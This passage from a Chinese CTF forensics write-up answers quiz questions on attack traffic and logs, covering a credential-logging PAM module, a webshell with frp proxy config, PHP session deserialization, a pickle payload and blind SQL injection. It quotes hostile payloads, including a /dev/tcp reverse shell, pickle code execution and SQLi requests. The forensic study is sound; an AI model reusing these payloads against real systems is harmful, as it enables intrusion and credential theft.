</span></span><span class=line><span class=cl><span class=nf>snprintf</span><span class=p>(</span><span class=n>message</span><span class=p>,</span><span class=mi>2048</span><span class=p>,</span><span class=s>&#34;Username %s</span><span class=se>\n</span><span class=s>Password: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nf>saveMessage</span><span class=p>(</span><span class=o>&amp;</span><span class=n>message</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>PAM_SUCCESS</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>并且发现后续黑客又再次查看了该文件，并对其进行了编译链接等操作，最终并再次查看了自身是否为root权限。</p><p>因此，可以确定答案确实为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>1.c
</span></span></code></pre></td></tr></table></div></div><h2 id=问五>问五</h2><h3 id=题目描述-5>题目描述</h3><p>昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客在服务器上编译的恶意so文件，文件名是_。</p><h3 id=题解-5>题解</h3><p>在上一题查看后，就已经发现1.c文件有过改动</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958373499-100fdb4c-0437-4f8d-ab1b-be33967d05ee-20240823215849-mvn7mfc.png alt=1713958373499-100fdb4c-0437-4f8d-ab1b-be33967d05ee></p><p>并在编译将其复制到了系统文件夹下</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958393272-fc8836ba-9644-4618-be69-229ab4581427-20240823215850-1aqpa24.png alt=1713958393272-fc8836ba-9644-4618-be69-229ab4581427></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>looter.so
</span></span></code></pre></td></tr></table></div></div><h2 id=问六>问六</h2><h3 id=题目描述-6>题目描述</h3><p>昨天，单位流量系统捕获了黑客攻击流量，请您分析流量后进行回答：<br>黑客在服务器上修改了一个配置文件，文件的绝对路径为_。（请确认绝对路径后再提交）。</p><h3 id=题解-6>题解</h3><p>将刚刚的恶意so文件又输入到一个文件夹下，并重新查看确认，可以判断确实为</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958400232-bd74c201-0f17-4b62-910c-738a1308cb48-20240823215850-a84c35x.png alt=1713958400232-bd74c201-0f17-4b62-910c-738a1308cb48></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>/etc/pam.d/common-auth
</span></span></code></pre></td></tr></table></div></div><h1 id=webshell>webshell</h1><h2 id=问一-2>问一</h2><h3 id=题目描述-7>题目描述</h3><p>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：<br>黑客登录系统使用的密码是_。</p><h3 id=题解-7>题解</h3><p>询问密码是多少，直接尝试搜索字符串pass，发现账户密码直接明文传输的</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958416577-62a2ec19-dda0-48df-af68-61b0d4cb4ab5-20240823215850-7bzvg31.png alt=1713958416577-62a2ec19-dda0-48df-af68-61b0d4cb4ab5></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>Admin123!@#
</span></span></code></pre></td></tr></table></div></div><h2 id=问二-1>问二</h2><h3 id=题目描述-8>题目描述</h3><p>黑客修改了一个日志文件，文件的绝对路径为__<br>答题格式：\xx\xxx\xxx\xxx.log<br>不区分大小写</p><h3 id=题解-8>题解</h3><p>通过搜索log的关键词，发现一个位置日志地址，并且进行了基本的枚举和木马写入操作</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958433248-493c0760-6753-4cb5-8372-84a52e271f9f-20240823215850-d9vcoht.png alt=1713958433248-493c0760-6753-4cb5-8372-84a52e271f9f></p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958448314-f7b89cc1-5252-4922-86b3-4a9411a52484-20240823215850-thsc61c.png alt=1713958448314-f7b89cc1-5252-4922-86b3-4a9411a52484></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>data/Runtime/Logs/Home/21_08_07.log
</span></span></code></pre></td></tr></table></div></div><p>还不对，需要补全</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>/var/www/html/data/Runtime/Logs/Home/21_08_07.log
</span></span></code></pre></td></tr></table></div></div><h2 id=问三-1>问三</h2><h3 id=题目描述-9>题目描述</h3><p>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：<br>黑客获取webshell之后，权限是__？</p><h3 id=题解-9>题解</h3><p>在刚刚的日志文件左右，发现了几个命令执行的动向，但是唯一成功，有200的仅有流312</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958462271-7b6e66d3-0791-4a60-9112-bffcf09a7b30-20240823215851-4fv6r8z.png alt=1713958462271-7b6e66d3-0791-4a60-9112-bffcf09a7b30></p><p>在user/group这里发现现在的用户权限为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>www-data
</span></span></code></pre></td></tr></table></div></div><h2 id=问四-1>问四</h2><h3 id=题目描述-10>题目描述</h3><p>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：<br>黑客写入的webshell文件名是_。</p><h3 id=题解-10>题解</h3><p>将流量包继续向下翻，发现在流334附近向下几个都在传输一个名为1.php的文件</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958475179-1c277bde-3bac-45d1-a4ee-074a166f551d-20240823215851-qryqsgt.png alt=1713958475179-1c277bde-3bac-45d1-a4ee-074a166f551d></p><p>追踪tcp流后很明显的看出是一个蚁剑的流量，可以确定木马就是</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958483515-04fd0a91-c36f-4cd9-8d98-becd32cd258d-20240823215851-oqffdrw.png alt=1713958483515-04fd0a91-c36f-4cd9-8d98-becd32cd258d></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>1.php
</span></span></code></pre></td></tr></table></div></div><h2 id=问五-1>问五</h2><h3 id=题目描述-11>题目描述</h3><p>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：<br>黑客上传的代理工具客户端名字是_。</p><h3 id=题解-11>题解</h3><p>在流346发现了有frpc.ini，明显的内网穿透工具</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958496154-11f8dcc4-d564-44cf-aba6-17e672974d0e-20240823215851-iyxtuem.png alt=1713958496154-11f8dcc4-d564-44cf-aba6-17e672974d0e></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>frpc
</span></span></code></pre></td></tr></table></div></div><h2 id=问六-1>问六</h2><h3 id=题目描述-12>题目描述</h3><p>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：<br>黑客代理工具的回连服务端IP是_。</p><h3 id=题解-12>题解</h3><p>发现一段奇怪的16进制</p><p><img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Picnet-img-1713958515478-82c1b446-0c50-4129-84a0-1f0ad91b2c40-20240823215852-w54keod.png alt=1713958515478-82c1b446-0c50-4129-84a0-1f0ad91b2c40></p><p>解码后得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>[common]
</span></span><span class=line><span class=cl>server_addr = 192.168.239.123
</span></span><span class=line><span class=cl>server_port = 7778
</span></span><span class=line><span class=cl>token=Xa3BJf2l5enmN6Z7A8mv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[test_sock5]
</span></span><span class=line><span class=cl>type = tcp
</span></span><span class=line><span class=cl>remote_port =8111
</span></span><span class=line><span class=cl>plugin = socks5
</span></span><span class=line><span class=cl>plugin_user = 0HDFt16cLQJ
</span></span><span class=line><span class=cl>plugin_passwd = JTN276Gp
</span></span><span class=line><span class=cl>use_encryption = true
</span></span><span class=line><span class=cl>use_compression = true
</span></span></code></pre></td></tr></table></div></div><p>因此得到回连地址</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>192.168.239.123
</span></span></code></pre></td></tr></table></div></div><h2 id=问七>问七</h2><h3 id=题目描述-13>题目描述</h3><p>单位网站被黑客挂马，请您从流量中分析出webshell，进行回答：<br>黑客的socks5的连接账号、密码是__。</p><h3 id=题解-13>题解</h3><p>根据解码得到的账号密码为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>0HDFt16cLQJ#JTN276Gp
</span></span></code></pre></td></tr></table></div></div><h1 id=日志分析>日志分析</h1><h2 id=问一-3>问一</h2><h3 id=题目描述-14>题目描述</h3><p>单位某应用程序被攻击，请分析日志，进行作答：<br>网络存在源码泄漏，源码文件名是_。</p><h3 id=题解-14>题解</h3><p>可以看到明显是在对目录进行信息泄露的爆破</p><p>尝试搜索200</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>172.17.0.1 - - [07/Aug/2021:01:37:59 +0000] &#34;GET /www%2ezip HTTP/1.1&#34; 200 1686 &#34;-&#34; &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36&#34;
</span></span><span class=line><span class=cl>172.17.0.1 - - [07/Aug/2021:01:37:59 +0000] &#34;GET /www%2ezip HTTP/1.1&#34; 200 1686 &#34;-&#34; &#34;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36&#34;
</span></span></code></pre></td></tr></table></div></div><p>可以看出泄露的源码文件为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>www.zip
</span></span></code></pre></td></tr></table></div></div><h2 id=问二-2>问二</h2><h3 id=题目描述-15>题目描述</h3><p>单位某应用程序被攻击，请分析日志，进行作答：<br>分析攻击流量，黑客往/tmp目录写入一个文件，文件名为_。</p><h3 id=题解-15>题解</h3><p>直接搜索tmp</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] &#34;GET /?filename=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftmp%2Fsess_car&amp;content=func%7CN%3Bfiles%7Ca%3A2%3A%7Bs%3A8%3A%22filename%22%3Bs%3A16%3A%22.%2Ffiles%2Ffilename%22%3Bs%3A20%3A%22call_user_func_array%22%3Bs%3A28%3A%22.%2Ffiles%2Fcall_user_func_array%22%3B%7Dpaths%7Ca%3A1%3A%7Bs%3A5%3A%22%2Fflag%22%3Bs%3A13%3A%22SplFileObject%22%3B%7D HTTP/1.1&#34; 302 879 &#34;-&#34; &#34;python-requests/2.26.0&#34;
</span></span><span class=line><span class=cl>172.17.0.1 - - [07/Aug/2021:01:38:21 +0000] &#34;GET /?file=sess_car HTTP/1.1&#34; 200 680 &#34;-&#34; &#34;python-requests/2.26.0&#34;
</span></span></code></pre></td></tr></table></div></div><p>url解码一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &#34;GET /?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:{s:8:&#34;filename&#34;;s:16:&#34;./files/filename&#34;;s:20:&#34;call_user_func_array&#34;;s:28:&#34;./files/call_user_func_array&#34;;}paths|a:1:{s:5:&#34;/flag&#34;;s:13:&#34;SplFileObject&#34;;} HTTP/1.1&#34; 302 879 &#34;-&#34; &#34;python-requests/2.26.0&#34;
</span></span><span class=line><span class=cl>172.17.0.1 - - [07/Aug/2021:01:38:21  0000] &#34;GET /?file=sess_car HTTP/1.1&#34; 200 680 &#34;-&#34; &#34;python-requests/2.26.0&#34;
</span></span></code></pre></td></tr></table></div></div><p>可以看出向tmp文件下写入了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>sess_car
</span></span></code></pre></td></tr></table></div></div><h2 id=问三-2>问三</h2><h3 id=题目描述-16>题目描述</h3><p>单位某应用程序被攻击，请分析日志，进行作答：<br>分析攻击流量，黑客使用的是__类读取了秘密文件</p><h3 id=题解-16>题解</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>{s:8:&#34;filename&#34;;s:16:&#34;./files/filename&#34;;s:20:&#34;call_user_func_array&#34;;s:28:&#34;./files/call_user_func_array&#34;;}paths|a:1:{s:5:&#34;/flag&#34;;s:13:&#34;SplFileObject&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>可以看出其中的类为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>SplFileObject
</span></span></code></pre></td></tr></table></div></div><h1 id=简单日志分析>简单日志分析</h1><h2 id=问一-4>问一</h2><h3 id=题目描述-17>题目描述</h3><p>某应用程序被攻击，请分析日志后作答：<br>黑客攻击的参数是__。（如有字母请全部使用小写）。</p><h3 id=题解-17>题解</h3><p>刚开始是明显在进行一个扫目录的操作，在找敏感信息泄露</p><p>唯一可控的攻击参数只有</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>127.0.0.1 - - [07/Aug/2021 10:43:12] &#34;GET /?user=STAKcDAKMFMnY2F0IC9UaDRzX0lTX1ZFUllfSW1wb3J0X0ZpMWUnCnAxCjAoZzAKbHAyCjAoSTAKdHAzCjAoZzMKSTAKZHA0CjBjb3MKc3lzdGVtCnA1CjBnNQooZzEKdFIu HTTP/1.1&#34; 500 -
</span></span></code></pre></td></tr></table></div></div><p>因此答案为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>user
</span></span></code></pre></td></tr></table></div></div><h2 id=问二-3>问二</h2><h3 id=题目描述-18>题目描述</h3><p>某应用程序被攻击，请分析日志后作答：<br>黑客查看的秘密文件的绝对路径是_。</p><h3 id=题解-18>题解</h3><p>先将两个可控参数分别解码得到</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>I0
</span></span><span class=line><span class=cl>p0
</span></span><span class=line><span class=cl>0S&#39;cat /Th4s_IS_VERY_Import_Fi1e&#39;
</span></span><span class=line><span class=cl>p1
</span></span><span class=line><span class=cl>0(g0
</span></span><span class=line><span class=cl>lp2
</span></span><span class=line><span class=cl>0(I0
</span></span><span class=line><span class=cl>tp3
</span></span><span class=line><span class=cl>0(g3
</span></span><span class=line><span class=cl>I0
</span></span><span class=line><span class=cl>dp4
</span></span><span class=line><span class=cl>0cos
</span></span><span class=line><span class=cl>system
</span></span><span class=line><span class=cl>p5
</span></span><span class=line><span class=cl>0g5
</span></span><span class=line><span class=cl>(g1
</span></span><span class=line><span class=cl>tR.
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>I0
</span></span><span class=line><span class=cl>p0
</span></span><span class=line><span class=cl>0S&#39;bash -i &gt;&amp; /dev/tcp/192.168.2.197/8888 0&gt;&amp;1&#39;
</span></span><span class=line><span class=cl>p1
</span></span><span class=line><span class=cl>0(g0
</span></span><span class=line><span class=cl>lp2
</span></span><span class=line><span class=cl>0(I0
</span></span><span class=line><span class=cl>tp3
</span></span><span class=line><span class=cl>0(g3
</span></span><span class=line><span class=cl>I0
</span></span><span class=line><span class=cl>dp4
</span></span><span class=line><span class=cl>0cos
</span></span><span class=line><span class=cl>system
</span></span><span class=line><span class=cl>p5
</span></span><span class=line><span class=cl>0g5
</span></span><span class=line><span class=cl>(g1
</span></span><span class=line><span class=cl>tR.
</span></span></code></pre></td></tr></table></div></div><p>绝对路径即为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>Th4s_IS_VERY_Import_Fi1e
</span></span></code></pre></td></tr></table></div></div><h2 id=问三-3>问三</h2><h3 id=题目描述-19>题目描述</h3><p>某应用程序被攻击，请分析日志后作答：<br>黑客反弹shell的ip和端口是_。（格式使用“ip:端口"，例如127.0.0.1:2333）。</p><h3 id=题解-19>题解</h3><p>根据上面解码的结果，即得</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>192.168.2.197:8888
</span></span></code></pre></td></tr></table></div></div><h1 id=sql注入>SQL注入</h1><h2 id=问一-5>问一</h2><h3 id=题目描述-20>题目描述</h3><p>某应用程序被攻击，请分析日志后作答：<br>黑客在注入过程中采用的注入手法叫_。</p><h3 id=题解-20>题解</h3><p>一眼布尔盲注</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>布尔盲注
</span></span></code></pre></td></tr></table></div></div><h2 id=问二-4>问二</h2><h3 id=题目描述-21>题目描述</h3><p>某应用程序被攻击，请分析日志后作答：<br>黑客在注入过程中，最终获取flag的数据库名、表名和字段名是_。（格式为“数据库名#表名#字段名”，例如database#table#column）。</p><h3 id=题解-21>题解</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>172.17.0.1 - - [01/Sep/2021:01:44:02 +0000] &#34;GET /index.php?id=1%20and%20if(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=&#39;flag&#39;%20and%20table_schema=&#39;sqli&#39;),5,1)%20=%20&#39;+&#39;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&#34; 200 506 &#34;-&#34; &#34;python-requests/2.26.0&#34;
</span></span><span class=line><span class=cl>172.17.0.1 - - [01/Sep/2021:01:45:55 +0000] &#34;GET /index.php?id=1%20and%20if(substr((select%20flag%20from%20sqli.flag),1,1)%20=%20&#39;%C2%80&#39;,1,(select%20table_name%20from%20information_schema.tables)) HTTP/1.1&#34; 200 429 &#34;-&#34; &#34;python-requests/2.26.0&#34;
</span></span></code></pre></td></tr></table></div></div><p>取这两段可以看出</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>sqli#flag#flag
</span></span></code></pre></td></tr></table></div></div><h2 id=问三-4>问三</h2><h3 id=题目描述-22>题目描述</h3><p>某应用程序被攻击，请分析日志后作答：<br>黑客最后获取到的flag字符串为_。</p><h3 id=题解-22>题解</h3><p>一个布尔盲注的提取，正则匹配一下即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>flag{deddcd67-bcfd-487e-b940-1217e668c7db}
</span></span></code></pre></td></tr></table></div></div></section><div class=comments><script>const getTheme=window.localStorage&&window.localStorage.getItem("theme");let theme=getTheme==="dark"?"dark":"light",s=document.createElement("script");s.src="https://giscus.app/client.js",s.setAttribute("data-repo","Wh1teJ0ker/discussion"),s.setAttribute("data-repo-id","R_kgDOOTzcZA"),s.setAttribute("data-category","Announcements"),s.setAttribute("data-category-id","DIC_kwDOOTzcZM4CoxXV"),s.setAttribute("data-mapping","pathname"),s.setAttribute("data-strict","0"),s.setAttribute("data-reactions-enabled","1"),s.setAttribute("data-emit-metadata","0"),s.setAttribute("data-input-position","top"),s.setAttribute("data-theme",theme),s.setAttribute("data-lang","zh-CN"),s.setAttribute("data-loading","lazy"),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div><div class=paginator><a class=prev href=https://wh1tej0ker.github.io/post/2024-west-lake-sword-discussion-zskx3a.html><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966 5.98257 11.8297 5.98456 11.9753 6.05061 12.0063c1.00435.4716 2.8788 1.9201 3.89435 2.9937M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentcolor" stroke-linecap="round"/></svg>
<span>2024西湖论剑</span></a>
<a class=next href=https://wh1tej0ker.github.io/post/2024-internet-of-vehicles-network-and-data-security-ctf-competition-z1vpry3.html><span>2024车联网网络和数据安全CTF竞赛</span><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966 16.0174 11.8297 16.0154 11.9753 15.9494 12.0063 14.945 12.4779 13.0706 13.9264 12.055 15m3.5006-3.0333C13.1345 12.0608 8 12 6 11" stroke="currentcolor" stroke-linecap="round"/></svg></a></div></article></div><footer class=footer><p>&copy; 2026 <a href=https://wh1tej0ker.github.io/>Wh1teJ0kerのBlog</a>
Powered by
<a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>
<a href=https://github.com/guangzhengli/hugo-theme-ladder rel=noopener target=_blank>Ladder</a>
️</p></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="Copy";function n(){t.innerHTML="Copied",setTimeout(()=>{t.innerHTML="Copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),n();return}const s=document.createRange();s.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(s);try{document.execCommand("copy"),n()}catch{}o.removeRange(s)}),e.parentNode.appendChild(t)})</script></main></body><script src=/main.min.cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e.js integrity="sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==" crossorigin=anonymous defer></script></html>